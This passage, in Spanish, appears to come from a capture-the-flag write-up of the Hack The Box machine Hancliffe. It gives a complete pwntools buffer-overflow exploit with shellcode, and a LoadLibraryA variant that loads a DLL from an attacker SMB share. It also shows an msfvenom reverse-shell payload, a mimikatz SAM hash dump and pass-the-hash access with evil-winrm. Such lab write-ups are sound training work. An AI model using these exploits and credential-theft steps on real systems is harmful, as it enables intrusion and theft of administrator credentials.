</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05</span><span class="s">"  
</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  
</span><span class="p">
offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))

shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb8\x7d\xe5\x1d\x63\xdb\xcf\xd9\x74\x24\xf4</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5e\x29\xc9\xb1\x52\x31\x46\x12\x03\x46\x12</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x83\x93\x19\xff\x96\x97\x0a\x82\x59\x67\xcb</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe3\xd0\x82\xfa\x23\x86\xc7\xad\x93\xcc\x85</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x41\x5f\x80\x3d\xd1\x2d\x0d\x32\x52\x9b\x6b</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7d\x63\xb0\x48\x1c\xe7\xcb\x9c\xfe\xd6\x03</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd1\xff\x1f\x79\x18\xad\xc8\xf5\x8f\x41\x7c</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x43\x0c\xea\xce\x45\x14\x0f\x86\x64\x35\x9e</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9c\x3e\x95\x21\x70\x4b\x9c\x39\x95\x76\x56</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb2\x6d\x0c\x69\x12\xbc\xed\xc6\x5b\x70\x1c</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x16\x9c\xb7\xff\x6d\xd4\xcb\x82\x75\x23\xb1</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\xf3\xb7\x11\x2a\xa3\x13\xa3\xff\x32\xd0</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xaf\xb4\x31\xbe\xb3\x4b\x95\xb5\xc8\xc0\x18</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x19\x59\x92\x3e\xbd\x01\x40\x5e\xe4\xef\x27</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5f\xf6\x4f\x97\xc5\x7d\x7d\xcc\x77\xdc\xea</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x21\xba\xde\xea\x2d\xcd\xad\xd8\xf2\x65\x39</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x51\x7a\xa0\xbe\x96\x51\x14\x50\x69\x5a\x65</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x79\xae\x0e\x35\x11\x07\x2f\xde\xe1\xa8\xfa</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x71\xb1\x06\x55\x32\x61\xe7\x05\xda\x6b\xe8</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7a\xfa\x94\x22\x13\x91\x6f\xa5\x16\x6c\x61</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x39\x4f\x72\x7d\x40\x34\xfb\x9b\x28\x5a\xaa</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x34\xc5\xc3\xf7\xce\x74\x0b\x22\xab\xb7\x87</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc1\x4c\x79\x60\xaf\x5e\xee\x80\xfa\x3c\xb9</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9f\xd0\x28\x25\x0d\xbf\xa8\x20\x2e\x68\xff</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x65\x80\x61\x95\x9b\xbb\xdb\x8b\x61\x5d\x23</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0f\xbe\x9e\xaa\x8e\x33\x9a\x88\x80\x8d\x23</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x95\xf4\x41\x72\x43\xa2\x27\x2c\x25\x1c\xfe</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x83\xef\xc8\x87\xef\x2f\x8e\x87\x25\xc6\x6e</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x39\x90\x9f\x91\xf6\x74\x28\xea\xea\xe4\xd7</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x21\xaf\x05\x3a\xe3\xda\xad\xe3\x66\x67\xb0</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x13\x5d\xa4\xcd\x97\x57\x55\x2a\x87\x12\x50</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x76\x0f\xcf\x28\xe7\xfa\xef\x9f\x08\x2f</span><span class="s">"
</span><span class="p">
payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter </span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="c1">        # padding</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="c1">     # egg</span><span class="p">
payload </span><span class="o">+= </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos el exploit a la maquina que corre el servicio en el puerto <code class="language-plaintext highlighter-rouge">9999</code> y recibimos una shell como <code class="language-plaintext highlighter-rouge">Administrator</code> donde podemos leer la ultima flag de root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.11.115 on port 9999: Done
[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.11.115 port 9999</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.115
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
hancliffe\administrator

C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
7cc**************************564

C:\Windows\system32></span>
</code></pre></div></div><br>

</section>

<section class="post" id="bof-loadlibrary">
<br><h3 class="post-title">Buffer Overflow - LoadLibraryA</h3><br>

<p class="plain-text">La siguiente forma de explotarlo involucra la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>, esta permite cargar librerias por lo que podriamos simplemente cargar un archivo <code class="language-plaintext highlighter-rouge">.dll</code> malicioso</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona getiat -m myfirstapp.exe -s loadlibrary
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py getiat -m myfirstapp.exe -s loadlibrary

[+] Processing arguments and criteria
    - Pointer access level : X
    - Only querying modules myfirstapp.exe
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] Querying 1 modules
[+] Preparing output file 'iatsearch.txt'
    - (Re)setting logfile C:\mona\iatsearch.txt
    Getting IAT for MyFirstApp.exe.
    Enumerating IAT
0x719081c8 | At 0x719081c8 in myfirstapp (base + 0x000081c8) : 0x778c0ed0 (ptr to KERNEL32.loadlibrarya)  - [KERNEL32] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.22621.3672, 0x4140  

1 entries found</span>
</code></pre></div></div><br>

<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> es bastante simple, solo recibe como <code class="language-plaintext highlighter-rouge">parametro</code> el nombre de la libreria, por lo que si la controlamos podemos cargar un <code class="language-plaintext highlighter-rouge">.dll</code> malicioso</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">HMODULE </span><span class="na">LoadLibraryA</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">LPCSTR </span><span class="p">lpLibFileName
);</span>
</code></pre></div></div><br>

<p class="plain-text">Como no tenemos suficiente espacio en el stack para toda la string la empujaremos con <code class="language-plaintext highlighter-rouge">push</code>, iniciamos definiendo la string, dandole la vuelta y pasandola a hexadecimal</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">smb</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">192.168.233.129</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex()  </span>
</code></pre></div></div><br>

<p class="plain-text">Para evitar solaparnos cuando empujemos datos al stack restaremos al puntero <code class="language-plaintext highlighter-rouge">esp</code> <code class="language-plaintext highlighter-rouge">0x64</code> bytes, luego con un <code class="language-plaintext highlighter-rouge">xor</code> hacemos que <code class="language-plaintext highlighter-rouge">ebx</code> valga <code class="language-plaintext highlighter-rouge">0</code> y lo empujamos al stack, esto ya que un null byte o <code class="language-plaintext highlighter-rouge">0x00</code> servirá para indicar que ahi termina la string</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">dll  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)  
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con un null terminator al final podemos empujar toda la string con la ruta smb al <code class="language-plaintext highlighter-rouge">.dll</code> malicioso al stack mediante un bucle <code class="language-plaintext highlighter-rouge">for</code> de <code class="language-plaintext highlighter-rouge">4</code> en <code class="language-plaintext highlighter-rouge">4</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">, </span><span class="no">len</span><span class="p">(smb), </span><span class="mi">8</span><span class="p">):
     dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push 0x"</span><span class="o"> +</span><span class="p"> smb[i:</span><span class="mi">8</span><span class="o">+</span><span class="p">i])</span>
</code></pre></div></div><br>

<p class="plain-text">Al finalizar el bucle la string deberia estar en <code class="language-plaintext highlighter-rouge">esp</code>, sin embargo necesitamos un puntero a <code class="language-plaintext highlighter-rouge">esp</code> por lo que con <code class="language-plaintext highlighter-rouge">push</code> empujamos el puntero al stack, para finalizar simplemente llamamos al desreferenciado de la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> para cargarla</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esp"</span><span class="p">)
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719081c8]"</span><span class="p">)  </span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit es bastante simple, empuja de <code class="language-plaintext highlighter-rouge">4</code> bytes en <code class="language-plaintext highlighter-rouge">4</code> bytes que es el tamaño de un <code class="language-plaintext highlighter-rouge">dword</code> toda la string y toma el puntero a esa ruta para llamar a <code class="language-plaintext highlighter-rouge">LoadLibraryA</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32, asm

</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
    sys.exit(</span><span class="mi">1</span><span class="p">)

smb</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">192.168.233.129</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex()  

dll  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)

for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">, </span><span class="no">len</span><span class="p">(smb), </span><span class="mi">8</span><span class="p">):
     dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push 0x"</span><span class="o"> +</span><span class="p"> smb[i:</span><span class="mi">8</span><span class="o">+</span><span class="p">i])

dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esp"</span><span class="p">)
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719081c8]"</span><span class="p">)

offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))

</span><span class="p">payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> dll
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">

shell</span><span class="o"> = </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Para probar en local creamos con <code class="language-plaintext highlighter-rouge">msfvenom</code> un dll que al cargarse ejecute una calculadora, luego lo compartimos en un recurso usando <code class="language-plaintext highlighter-rouge">smbserver</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/exec CMD=calc.exe -f dll -o shell.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 193 bytes
Final size of dll file: 9216 bytes
Saved as: shell.dll

</span><span class="ve">❯ impacket-smbserver</span><span class="p"> user . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos ver como se comporta en el debugger, al terminar los push de la string la ruta <code class="language-plaintext highlighter-rouge">smb</code> se encuentra en el stack y al empujar <code class="language-plaintext highlighter-rouge">esp</code> ahora en el stack se encuentra el puntero a esa string y ese será el argumento a la funcion <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>, si solo continuamos con la ejecución se carga la libreria maliciosa y se abre la calculadora</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp 0x719023b3

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=0127fed6 ebx=00000138 ecx=00e73da0 edx=000a7190 esi=71901a3d edi=71901a3d  
eip=719023b3 esp=0127ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
MyFirstApp+0x23b3:
719023b3 ffe0            jmp     eax {0127fed6}

</span><span class="ro">0:000></span><span class="p"> u eax Ld
0127fed6 83ec64          sub     esp,64h
0127fed9 31db            xor     ebx,ebx
0127fedb 53              push    ebx
0127fedc 682e646c6c      push    6C6C642Eh
0127fee1 6868656c6c      push    6C6C6568h
0127fee6 6865725c73      push    735C7265h
0127feeb 68395c7573      push    73755C39h
0127fef0 68332e3132      push    32312E33h
0127fef5 68382e3233      push    33322E38h
0127fefa 68322e3136      push    36312E32h
0127feff 685c5c3139      push    39315C5Ch
0127ff04 54              push    esp
0127ff05 ff15c8819071    call    dword ptr [MyFirstApp+0x81c8 (719081c8)]

</span><span class="ro">0:000></span><span class="p"> g 0x0127ff04
eax=0127fed6 ebx=00000000 ecx=00e73da0 edx=000a7190 esi=71901a3d edi=71901a3d
eip=0127ff04 esp=0127fe94 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0127ff04 54              push    esp

</span><span class="ro">0:000></span><span class="p"> da esp
0127fe94  "\\192.168.233.129\user\shell.dll"

</span><span class="ro">0:000></span><span class="p"> p
eax=0127fed6 ebx=00000000 ecx=00e73da0 edx=000a7190 esi=71901a3d edi=71901a3d
eip=0127ff05 esp=0127fe90 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0127ff05 ff15c8819071    call    dword ptr [MyFirstApp+0x81c8 (719081c8)] ds:002b:719081c8={KERNEL32!LoadLibraryAStub (778c0ed0)}  

</span><span class="ro">0:000></span><span class="p"> da poi(esp)
0127fe94  "\\192.168.233.129\user\shell.dll"</span>
</code></pre></div></div><br>

<a href="/hackthebox/hancliffe/29.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/29.png"></p></div></a>

<p class="plain-text">Ahora que funciona simplemente creamos un nuevo <code class="language-plaintext highlighter-rouge">.dll</code> pero en lugar de una calculadora envia una <code class="language-plaintext highlighter-rouge">revshell</code> a nuestro equipo, en el exploit simplemente modificamos la ruta y la dirección ip a la máquina victima por el puerto <code class="language-plaintext highlighter-rouge">9999</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f dll -o shell.dll  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 1786 bytes
Final size of dll file: 9216 bytes
Saved as: shell.dll

</span><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32, asm

smb</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.10.10.10</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex()  

dll  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)

for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">, </span><span class="no">len</span><span class="p">(smb), </span><span class="mi">8</span><span class="p">):
     dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push 0x"</span><span class="o"> +</span><span class="p"> smb[i:</span><span class="mi">8</span><span class="o">+</span><span class="p">i])

dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esp"</span><span class="p">)
dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719081c8]"</span><span class="p">)

offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))

</span><span class="p">payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> dll
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">,</span><span class="mi"> 9999</span><span class="p">)

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos el exploit a la maquina que corre el servicio en el puerto <code class="language-plaintext highlighter-rouge">9999</code> y recibimos una shell como <code class="language-plaintext highlighter-rouge">Administrator</code> donde podemos leer la ultima flag de root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.11.115 on port 9999: Done
[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.11.115 port 9999</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.115
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
hancliffe\administrator

C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
7cc**************************564

C:\Windows\system32></span>
</code></pre></div></div><br>

</section>

<section class="post" id="extra-administrator">
<br><h3 class="post-title">Extra - Administrator</h3><br>

<p class="plain-text">Para evitar tener que explotar el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> cada que quieramos ganar acceso al equipo podemos dumpear la <code class="language-plaintext highlighter-rouge">sam</code> con mimikatz y ver el hash de <code class="language-plaintext highlighter-rouge">Administrator</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\ProgramData></span><span class="am">.\mimikatz.exe </span><span class="p">token::elevate lsadump::sam exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

576	{0;000003e7} 1 D 44768     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000594ba} 0 D 3005899   	HANCLIFFE\Administrator	S-1-5-21-3164362660-1422884991-4018309589-500	(14g,25p)	Primary  
 * Thread Token  : {0;000003e7} 1 D 3056951   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : HANCLIFFE
SysKey : 087e8f3d7b9d641b8cca24afabe7ddbd
Local SID : S-1-5-21-3164362660-1422884991-4018309589

SAMKey : f7e804e09c55219d90ba58d9df1a47be

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 2e5e9a333abf90ec9673220eb3befb83

mimikatz(commandline) # exit
Bye!

C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Aprovechando el proxy que creamos antes podemos conectarnos por <code class="language-plaintext highlighter-rouge">winrm</code> haciendo un passthehash y obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code> mucho mas interactiva</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i 10.10.11.115 -u Administrator -H 2e5e9a333abf90ec9673220eb3befb83  
PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
hancliffe\administrator
PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\root.txt
7cc**************************564
PS C:\Users\Administrator\Documents></span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
